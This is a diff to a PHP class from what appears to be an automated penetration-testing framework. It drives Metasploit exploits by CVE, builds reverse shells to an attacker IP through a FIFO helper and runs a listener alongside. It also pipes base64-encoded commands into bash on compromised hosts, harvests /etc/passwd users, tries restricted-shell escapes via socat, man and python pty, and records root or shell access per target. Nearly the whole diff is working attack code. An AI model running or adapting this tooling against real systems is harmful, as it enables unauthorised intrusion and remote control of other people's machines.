@@ -23,16 +23,19 @@ class SERVICE4COM extends AUTH {
 
         if (!empty($file_exploit)){
             $tab_payloads = $this->service8msf8exploit2payloads($file_exploit);
+            if ($this->flag_poc){
             $this->article("ALL Payloads",$this->tab($tab_payloads));
-            
+            $this->msf2info($file_exploit);
+            }
             foreach ($tab_payloads as $payload){
                 $payload = trim($payload);
                 if (!empty($payload)){
-                    //$this->service8msf8exploit2payload2options($file_exploit, $payload);$this->pause();
+                    
                     
                     switch ($payload){
                         case "php/exec" :
-                                $cmd = "use $file_exploit;set RHOSTS $target_ip;set RPORT $target_port;set payload php/exec;set CMD \"%CMD%\";run;exit";
+                            $this->service8msf8exploit2payload2options($file_exploit, $payload);$this->pause();
+                            $cmd = "use $file_exploit;set RHOSTS $target_ip;set RPORT $target_port;set payload php/exec;set CMD \"%CMD%\";run;exit";
                            break;
                             }
                     
@@ -41,7 +44,9 @@ class SERVICE4COM extends AUTH {
             }
             
             
-            $query = "msfconsole -q -x '$cmd' " ;
+            $query = "msfconsole -q -x '$cmd' 2> /dev/null " ;
+            $this->pause();
+            $this->article("msf>", $cmd);
             $this->pause();
             if (!empty($cmd)) return $query;
             else return $cmd;
@@ -49,7 +54,7 @@ class SERVICE4COM extends AUTH {
     }
     
     
-    public function msf2search2exec($cve){
+    public function msf2search2exec($cve,$name,$platform,$app){
         $cve = trim($cve);
         
         $files_exploit = array();
@@ -58,7 +63,7 @@ class SERVICE4COM extends AUTH {
         
         $attacker_ip = $this->ip4addr4target($this->ip);
         
-        $files_exploit = array_filter($this->msf2search($cve)) ;
+        $files_exploit = array_filter($this->msf2cve($cve,$name,$platform,$app)) ;
         if (!empty($files_exploit)){
             foreach ($files_exploit as $file_exploit){
                 if(!empty($file_exploit)){
@@ -68,12 +73,13 @@ class SERVICE4COM extends AUTH {
                     $cmd_rev = $this->msf2exec($file_exploit,$this->ip,$this->port,$attacker_ip,$lport);
                     if (!empty($cmd_rev)){
                         $templateB64_shell = base64_encode(str_replace("%CMD%", "%SHELL%", $cmd_rev));
-                        
-                        $rev = $this->rev8nc($attacker_ip, $lport, $shell) ;
-                        $cmd = str_replace("%CMD%", $rev, $cmd_rev);
                         $lprotocol = 'T';
                         $type = 'server';
+                        
+                        $rev = $this->rev8fifo($attacker_ip, $lport, $shell) ; // OK Lampio
+                        $cmd = str_replace("%CMD%", $rev, $cmd_rev);
                         $this->service4lan($cmd, $templateB64_shell, $lport, $lprotocol,$type);
+
                     }
                     
                 }
@@ -161,7 +167,7 @@ class SERVICE4COM extends AUTH {
     public function service4lan($cmd_rev,$templateB64_shell,$lport,$lprotocol,$type){
         $templateB64_cmd = base64_encode(str_replace("%SHELL%", "%CMD%", base64_decode($templateB64_shell)));
         $cmd1 = "php pentest.php LAN \"$this->eth $this->domain $this->ip $this->port $this->protocol $lport $lprotocol $templateB64_cmd $templateB64_shell $type 30 listening_Server\" ";
-        $time = $this->stream_timeout ;       
+        $time = $this->stream_timeout*3 ;       
         if ($type=="client") $this->exec_parallel($cmd_rev, $cmd1, $time);
         if ($type=="server") $this->exec_parallel($cmd1, $cmd_rev, $time);
     }
@@ -195,11 +201,11 @@ class SERVICE4COM extends AUTH {
         }
         
         //sort($this->tab_users_etc_passwd);
-        $this->tab_users_etc_passwd = array_filter($this->tab_users_etc_passwd);
+        if (!empty($this->tab_users_etc_passwd)) $this->tab_users_etc_passwd = array_filter(array_unique($this->tab_users_etc_passwd));
         $this->article("All Users /etc/passwd","\n".$this->tab($this->tab_users_etc_passwd));
         
         //sort($this->tab_users_shell);
-        $this->tab_users_shell = array_filter($this->tab_users_shell);
+        if (!empty($this->tab_users_shell)) $this->tab_users_shell = array_filter(array_unique($this->tab_users_shell));
         $this->article("All Users SHELL","\n".$this->tab($this->tab_users_shell));        
     }
     
@@ -207,7 +213,7 @@ class SERVICE4COM extends AUTH {
         // msfvenom -l payloads | grep "cmd/unix/" | awk '{print $1}'
         // cmd/unix/interact
         $type = strtolower(trim($type)) ;
-        $cmd1 = "msfconsole -q -y /usr/share/metasploit-framework/config/database.yml -r $exploit_rc ";
+        $cmd1 = "msfconsole -q -y /usr/share/metasploit-framework/config/database.yml -r $exploit_rc  2> /dev/null ";
         $cmd2 = "php pentest.php LAN \"$this->eth $this->domain $this->ip $this->port $this->protocol $lport $lprotocol ".base64_encode($template)." server 30 listening_Server\" ";
         
         if ($type=="client") $this->requette("php parallel.php \"$cmd1\" \"$cmd2\" \"5\" ");
@@ -218,7 +224,7 @@ class SERVICE4COM extends AUTH {
     public function service8msf8exploit2payloads($exploit){
         $exploit = trim($exploit);
         $rst = array();
-        $query = "msfconsole -q  -x \"use $exploit;show payloads;exit;\" | grep '/' | awk '{print $2}'";
+        $query = "msfconsole -q  -x \"use $exploit;show payloads;exit;\" 2> /dev/null  | grep '/' | awk '{print $2}'";
         if (!empty($exploit)) return $this->req_ret_tab($query);
         else return $rst;
     }
@@ -226,7 +232,7 @@ class SERVICE4COM extends AUTH {
     public function service8msf8exploit2payload2options($exploit,$payload){
         $exploit = trim($exploit);
         $payload = trim($payload);
-        $query = "msfconsole -q -x \"use $exploit;set payload $payload;show options;exit;\" ";
+        $query = "msfconsole -q -x \"use $exploit;set payload $payload;show options;exit;\" 2> /dev/null  ";
         if ( (!empty($exploit)) && (!empty($payload)) ) return $this->req_ret_str($query);
         else return "";
     }
@@ -284,7 +290,7 @@ class SERVICE4COM extends AUTH {
         
         $this->article("TIMEOUT", $timeout."s");
         $this->article("DATA", $data);
-        $data = "echo '".base64_encode($data)."' | base64 -d | /bin/bash - "; // 2> /dev/null
+        $data = "echo '".base64_encode($data)."' | base64 -d | bash - "; // 2> /dev/null
         $this->article("CMDLINE", $data);
         //$this->article("CMD BASE64", $data);
         if(is_resource($stream)){
@@ -294,7 +300,7 @@ class SERVICE4COM extends AUTH {
                 
                 case "SSH2 Session":
                     $stream = ssh2_exec($stream, $data);
-                    //$stream = ssh2_shell($con, 'vt102', null, 80, 24, SSH2_TERM_UNIT_CHARS);
+                    //$stream = ssh2_shell($stream, 'vt102', null, 80, 24, SSH2_TERM_UNIT_CHARS);
                     //$stream_out = ssh2_fetch_stream($stream, SSH2_STREAM_STDIO);
                     
                     
@@ -303,7 +309,9 @@ class SERVICE4COM extends AUTH {
                     stream_set_blocking($stream, TRUE);
                     stream_set_timeout($stream, $timeout);
                     //$status = stream_get_meta_data($stream);
-                    $result = stream_get_contents($stream);
+                    fgets($stream);
+                    $result = "";
+                    $result = @stream_get_contents($stream);
                     echo $result;
                     //$result .= $this->article("CMD", $data); $this->pause();
                     //  }
@@ -314,18 +322,23 @@ class SERVICE4COM extends AUTH {
                 
                 fflush($stream);
                 //var_dump($this->stream);
+                 
                 fputs($stream, "$data\n");
                 //stream_socket_sendto($stream, $data,STREAM_OOB,"$this->ip");
+                fflush($stream);
                 stream_set_blocking($stream, TRUE);
                 stream_set_timeout($stream,$timeout);
                 //sleep(1);
                 //$result = fgetss($stream, 9182);
+                //$fgets = "";$fgets = fgets($stream);$this->rouge($fgets);
+                fgets($stream);
+                $result = "";
                 $result = @stream_get_contents($stream);
                 // 
                 while (strstr($result, "[sudo] password for ")){
                     $data = "";
                     fputs($stream, "$data\n");
-                    $result = @stream_get_contents($stream);;
+                    $result = @stream_get_contents($stream);
                 }
                 echo $result."\n";
                 break;
@@ -529,16 +542,16 @@ class SERVICE4COM extends AUTH {
         $login = trim($login);
         
         $query = "file $private_key_file";
-        $check_pem = $this->req_ret_str($query);
-        if (strstr($check_pem, "PEM RSA private key")){
+        $check_pem = trim($this->req_ret_str($query));
+        if (strstr($check_pem, "PEM RSA private key")!==FALSE){
             $this->log2succes("Convert PEM for libssh - PHP",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"","");
             $private_key_file = $this->key2gen4priv2pem("", 10, $private_key_file,$private_key_passwd);
         }
         $query = "cat $private_key_file";
-        $priv_keys = $this->req_ret_str($query);
+        $priv_keys = trim($this->req_ret_str($query));
         if (empty($priv_keys)) return $this->log2error("Empty Private Key",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"","");
         $query = "cat $public_key_file";
-        $pub_keys = $this->req_ret_str($query);
+        $pub_keys = trim($this->req_ret_str($query));
         if (empty($pub_keys)) return $this->log2error("Empty Public Key",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
         $cmd = "id";
         $this->requette("chmod 600 $private_key_file");
@@ -563,11 +576,7 @@ class SERVICE4COM extends AUTH {
         $this->requette("ls -al $private_key_file");
         $this->requette("file $private_key_file");
         $this->requette("cat $private_key_file");
-        if (ssh2_auth_pubkey_file($con,
-            $login,
-            $public_key_file,
-            $private_key_file,
-            "$private_key_passwd")) {
+        if (ssh2_auth_pubkey_file($con,$login,$public_key_file,"$private_key_file.pem",$private_key_passwd)!==FALSE) {
             
             $this->yesAUTH($this->port2id, $login, "", "", "", "", "", "", $infos, $this->ip2geoip());
             $this->log2succes("Identification réussie en utilisant une clé publique",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
@@ -638,62 +647,77 @@ class SERVICE4COM extends AUTH {
         
     }
     
-    public function stream8shell2check($stream){
+    
+    public function stream8shell2check4echo($stream,$input_exec,$output_search){
         $this->ssTitre(__FUNCTION__);
         $check = "";
         if (is_resource($stream)){
-        $str = sha1($this->user2agent,FALSE);
-        $data = "echo '$str' ";
-        $data_check = "echo ".base64_encode($data)." | base64 -d | bash -";
-        $this->article("EXEC FROM STREAM", $data_check);
-        fputs($stream, "$data_check\n");
-        $tmp = "";
-        //while(!feof($stream) && empty($tmp) && sleep(10) ){
-        $tmp = stream_get_contents($stream);
-        $tmp = trim($tmp);
-        
-        //var_dump($tmp);
-        
-        $tmp2 = array();
-        exec("echo \"$tmp\" | grep -Po \"^$str\" ",$tmp2);
-        
-        if (!empty($tmp2)) $check = $tmp2[0];
-        unset($tmp2);
-        
-        if (stristr($check,$str)) {
-            $this->note("Success Executed Command");
-            return TRUE ;
+            $str = sha1($this->user2agent,FALSE);
+            $data = "echo '$str' ";
+            $data_check = "echo ".base64_encode($data)." | base64 -d | bash -";
+            $this->article("EXEC FROM STREAM", $data_check);
+            fputs($stream, "$data_check\n");
+            $tmp = "";
+            //while(!feof($stream) && empty($tmp) && sleep(10) ){
+            $tmp = @stream_get_contents($stream);
+            $tmp = trim($tmp);
+            echo "$tmp\n";
+            //var_dump($tmp);
+            
+            $tmp2 = array();
+            exec("echo \"$tmp\" | grep -Po \"^$str\" ",$tmp2);
+            
+            if (!empty($tmp2)) $check = $tmp2[0];
+            unset($tmp2);
+            
+            //var_dump($check);
+            if (stristr($check,$str)) {
+                $this->note("Success Executed Command echo");
+                return TRUE ;
+            }
+            else {
+                $chaine = "DO NOT FOUND $str - COMMAND echo NOT EXECUTED";
+                $this->note($chaine);
+                $this->log2error("NOT bash SHELL",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
+            return FALSE;
+            }
         }
-        else {
-            $chaine = "DO NOT FOUND $str - COMMAND NOT EXECUTED";
-            $this->note($chaine);
-            $this->log2error("NOT bash SHELL",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
-            /*
-            https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/
-            https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/
-            https://resources.infosecinstitute.com/privilege-escalation-linux-live-examples/#gref
-            */
-            var_dump($tmp);
+    }
+    
+    
+    public function stream8shell2check($stream){
+        $this->ssTitre(__FUNCTION__);
+        /*
+         https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/
+         https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/
+         https://resources.infosecinstitute.com/privilege-escalation-linux-live-examples/#gref
+         */
+        $check = "";
+        if (is_resource($stream)){
+            
+            
             $data = "echo \$SHELL";
             $this->article("DATA", $data);
             fputs($stream, "$data\n");
             
             
-            $tmp = stream_get_contents($stream);
+            $tmp = @stream_get_contents($stream);
             echo "$tmp\n";
             exec("echo '$tmp' $this->filter_file_path",$tmp2);
             if (!empty($tmp2)) {
                 $shell_found = $tmp2[0];
-                if (strstr($shell_found, "lshell")) $this->article("LIMITED SHELL", $shell_found);
-                if (strstr($shell_found, "rbash"))  $this->article("RESTRICTED Bash", $shell_found);
-                if (strstr($shell_found, "rksh"))  $this->article("Korn Shell in restricted mode", $shell_found);
-                if (strstr($shell_found, "rzsh"))  $this->article("RESTRICTED SHELL", $shell_found);
-                if (strstr($shell_found, "rssh"))  $this->article("Restricted Secure Shell", $shell_found);
+                if (strstr($shell_found, "/bin/lshell")) {$this->rouge("LIMITED SHELL: $shell_found");return FALSE;}
+                if (strstr($shell_found, "/bin/rbash"))  {$this->rouge("RESTRICTED Bash: $shell_found");return FALSE;}
+                if (strstr($shell_found, "/bin/rksh"))  {$this->rouge("Korn Shell in restricted mode: $shell_found");return FALSE;}
+                if (strstr($shell_found, "/bin/rzsh"))  {$this->rouge("RESTRICTED SHELL: $shell_found");return FALSE;}
+                if (strstr($shell_found, "/bin/rssh"))  {$this->rouge("Restricted Secure Shell: $shell_found");return FALSE;}
+                if (strstr($shell_found, "/bin/bash"))  {$this->note("Bash Shell: $shell_found");return TRUE;}
+                if (strstr($shell_found, "/bin/csh"))  {$this->note("C Shell: $shell_found");return TRUE;}
+                
             }
             return FALSE;
         }
-        }
-        else return FALSE ;
+
     }
     
     
@@ -712,7 +736,7 @@ class SERVICE4COM extends AUTH {
 
             
             if ($this->stream8shell2check($stream)) {
-                
+                $this->note("Normal Shell");
                 $template_id = "%ID%";
                 $template_shell = str_replace("%CMD%", "%SHELL%", $template_cmd);
                 return array($stream,$template_id,$template_cmd,$template_shell) ;
@@ -720,6 +744,37 @@ class SERVICE4COM extends AUTH {
             else {
                 
                 //https://www.hackingarticles.in/multiple-methods-to-bypass-restricted-shell/
+                
+                $data = "/usr/bin/id";
+                $this->article("DATA", $data);
+                fputs($stream, "$data\n");
+                
+                $rst_id = @stream_get_contents($stream);
+                list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context) = $this->parse4id($rst_id);
+                if (!empty($uid_name)){
+                    $cmd = "%CMD%";
+                    $template_id = str_replace("/usr/bin/id","%ID%",$data);
+                    $template_shell = str_replace("%CMD%", "%SHELL%", $template_cmd);
+                    return array($stream,$template_id,$template_cmd,$template_shell) ;
+                    
+                }
+                $this->pause();
+                
+                
+                $data = "id";
+                $this->article("DATA", $data);
+                fputs($stream, "$data\n");
+                
+                $rst_id = @stream_get_contents($stream);
+                list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context) = $this->parse4id($rst_id);
+                if (!empty($uid_name)){
+                    $cmd = "%CMD%";
+                    $template_id = str_replace("id","%ID%",$data);
+                    $template_shell = str_replace("%CMD%", "%SHELL%", $template_cmd);
+                    return array($stream,$template_id,$template_cmd,$template_shell) ;
+                    
+                }
+                $this->pause();
                 
                 //  ===================================================================
                 $data = "echo $0";
@@ -771,7 +826,7 @@ class SERVICE4COM extends AUTH {
                 fputs($stream, "$data\n");
                 echo stream_get_contents($stream);
       
-                
+                /*
                 $data = "(sleep 15; echo \"! bash -li\";sleep 8 ; ) | socat - EXEC:\"man man\",pty,stderr,setsid,sigint,ctty,sane";
                 $this->article("DATA", $data);
                 fputs($stream, "$data\n");
@@ -782,6 +837,7 @@ class SERVICE4COM extends AUTH {
                 fputs($stream, "$data\n");
                 $tmp = stream_get_contents($stream);
                 echo "$tmp\n";
+                
                 
                 $data = "echo -e \"man man <<# >/dev/null 2>&1\n! bash -li\nwhoami > /dev/tty\nls > /dev/tty\n#\" | bash ";
                 $this->article("DATA", $data);
@@ -867,7 +923,7 @@ class SERVICE4COM extends AUTH {
                     
                 }
                 $this->pause();
-                
+                */
                 
                 $data = "export SHELL=/bin/bash:\$SHELL ; export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ; /usr/bin/id";
                 $this->article("DATA", $data);
@@ -885,7 +941,7 @@ class SERVICE4COM extends AUTH {
                 }
                 $this->pause();
 
-                exit();
+                
                 
                 $data = "printf \"%s\\n\" $0";
                 $this->article("DATA", $data);
@@ -956,7 +1012,7 @@ class SERVICE4COM extends AUTH {
                 $tmp = stream_get_contents($stream);
                 echo "$tmp\n";
                 
-                $data = "python -c 'import pty; pty.spawn(\"/bin/bash -li\")'";
+                $data = "python -c 'import pty; pty.spawn(\"/bin/bash\")'";
                 $this->article("DATA", $data);
                 fputs($stream, "$data\n");
                 $tmp = stream_get_contents($stream);
@@ -1102,76 +1158,40 @@ class SERVICE4COM extends AUTH {
     
     public function  port2root($template_b64){
         $this->ssTitre(__FUNCTION__);
-        $sql_r_1 = "SELECT ".__FUNCTION__." FROM PORT WHERE $this->port2where  AND ".__FUNCTION__." <> 0";
-        
-        if ($this->checkBD($sql_r_1) ) return  base64_decode($this->req2BD4out(__FUNCTION__,"PORT","$this->port2where "));
-        else {
-            $template = base64_decode($template_b64);
-            $chaine = "YES ROOT on $this->ip:$this->port";
-            $this->log2succes($chaine,__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
-            $sql_ip = "UPDATE IP SET ip2root=1 WHERE $this->ip2where  ";
-            $this->mysql_ressource->query($sql_ip);
-            
-            $result = $template_b64;
-            return base64_decode($this->req2BD4in(__FUNCTION__,"PORT","$this->port2where ",$result));
-        }
-        
+        $chaine = "YES ROOT on $this->ip:$this->port with ".base64_decode($template_b64);
+        $this->log2succes($chaine,__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
+        $sql_ip = "UPDATE IP SET ip2root=1 WHERE $this->ip2where  ";
+        $this->mysql_ressource->query($sql_ip);  
+        $this->port2shell($template_b64);
     }
     
     public function  port2read($template_b64){
         $this->ssTitre(__FUNCTION__);
-        $sql_r_1 = "SELECT ".__FUNCTION__." FROM PORT WHERE $this->port2where  AND ".__FUNCTION__." <> 0";
-        
-        if ($this->checkBD($sql_r_1) ) return  base64_decode($this->req2BD4out(__FUNCTION__,"PORT","$this->port2where "));
-        else {
-            $template = base64_decode($template_b64);
-            $chaine = "YES READ on $this->ip:$this->port with $template";
+        $chaine = "YES READ on $this->ip:$this->port with ".base64_decode($template_b64);
             $this->log2succes($chaine,__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
             $sql_ip = "UPDATE IP SET ip2read=1 WHERE $this->ip2where  ";
             $this->mysql_ressource->query($sql_ip);
-            
-            $result = $template_b64;
-            return base64_decode($this->req2BD4in(__FUNCTION__,"PORT","$this->port2where ",$result));
-        }
-        
     }
     
-    public function  port2write($template_b64){
-      
+    public function  port2write($template_b64){      
         $this->ssTitre(__FUNCTION__);
-        $sql_r_1 = "SELECT ".__FUNCTION__." FROM PORT WHERE $this->port2where  AND ".__FUNCTION__." <> 0";
-        
-        if ($this->checkBD($sql_r_1) ) return  base64_decode($this->req2BD4out(__FUNCTION__,"PORT","$this->port2where "));
-        else {
-            $template = base64_decode($template_b64);
-            $chaine = "YES WRITE on $this->ip:$this->port with $template";
-            $this->log2succes($chaine,__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
-            $sql_ip = "UPDATE IP SET ip2write=1 WHERE $this->ip2where  ";
-            $this->mysql_ressource->query($sql_ip);
-            
-            $result = $template_b64;
-            return base64_decode($this->req2BD4in(__FUNCTION__,"PORT","$this->port2where ",$result));
-        }
-    }
+        $chaine = "YES WRITE on $this->ip:$this->port with ".base64_decode($template_b64);
+        $this->log2succes($chaine,__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
+        $sql_ip = "UPDATE IP SET ip2write=1 WHERE $this->ip2where  ";
+        $this->mysql_ressource->query($sql_ip);
+        $this->port2read($template_b64);
+       }
     
     
     public function  port2shell($template_b64){
         $this->ssTitre(__FUNCTION__);
-        var_dump($template_b64);
-        $this->pause();
-        $sql_r_1 = "SELECT ".__FUNCTION__." FROM PORT WHERE $this->port2where  AND ".__FUNCTION__." <> 0";
-        
-        if ($this->checkBD($sql_r_1) ) return  base64_decode($this->req2BD4out(__FUNCTION__,"PORT","$this->port2where "));
-        else {
-            $template = base64_decode($template_b64);
-            $chaine = "YES SHELL on $this->ip:$this->port with $template";
+
+            $chaine = "YES SHELL on $this->ip:$this->port with ".base64_decode($template_b64);
             $this->log2succes($chaine,__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
             $sql_ip = "UPDATE IP SET ip2shell=1 WHERE $this->ip2where  ";
             $this->mysql_ressource->query($sql_ip);
-            
-            $result = $template_b64;
-            return base64_decode($this->req2BD4in(__FUNCTION__,"PORT","$this->port2where ",$result));
-        }
+            $this->port2write($template_b64);
+
         
     }
     
@@ -1187,18 +1207,15 @@ class SERVICE4COM extends AUTH {
 
     
     public function key2gen4priv($stream,$timeout,$private_key_file,$private_key_passwd){
-        
-        
-        $this->key2gen4priv2pem($stream,$timeout,$private_key_file,$private_key_passwd);
-        
         $this->ssTitre ( "Gen Private key " );
-        if(!file_exists($private_key_file)) $this->requette("openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:2048 -out $file_path_name" );
+        if(!file_exists($private_key_file)) $this->requette("openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:2048 -out $private_key_file" );
         
         $query = "openssl rsa -check -in $private_key_file";
         $this->req_str($stream,$query,$timeout);
         $query = "openssl rsa -in $private_key_file -text -noout";
         //$this->req_str($stream,$query,$timeout);
         $this->req_str($stream,"ls -al $private_key_file",$timeout);
+        $this->key2gen4priv2pem($stream,$timeout,$private_key_file,$private_key_passwd);
         return trim($this->req_str($stream,"cat $private_key_file",$timeout ));
     }
     
@@ -1206,7 +1223,13 @@ class SERVICE4COM extends AUTH {
     
     public function key2gen4public($stream,$timeout,$private_key_file, $public_key_file, $private_key_passwd){
         $this->ssTitre ( "Gen Public key" );
-       // if(!file_exists($public_key_file)) {           
+        $public_key_str = "";
+        if (empty($private_key_file)) {
+            $this->log2error("Empty Private key", __FILE__,__CLASS__,__FUNCTION__,__LINE__, "Empty Private key:$public_key_file","");
+            return $public_key_str;
+        }
+        
+        if(!file_exists($public_key_file)) {           
             if (!empty($private_key_passwd)) {
 
                 $this->req_str($stream,"openssl rsa -in $private_key_file -passin pass:$private_key_passwd -pubout -out $public_key_file.tmp",$timeout );
@@ -1215,7 +1238,7 @@ class SERVICE4COM extends AUTH {
             $this->req_str($stream,"cat $public_key_file.tmp",$timeout );
             $this->req_str($stream,"ssh-keygen -i -m PKCS8 -f $public_key_file.tmp > $public_key_file ",$timeout);
             
-       // }
+        }
         
         $this->req_str($stream,"ssh-keygen -l -f $public_key_file ",$timeout);
         $this->req_str($stream,"ls -al $public_key_file",$timeout);
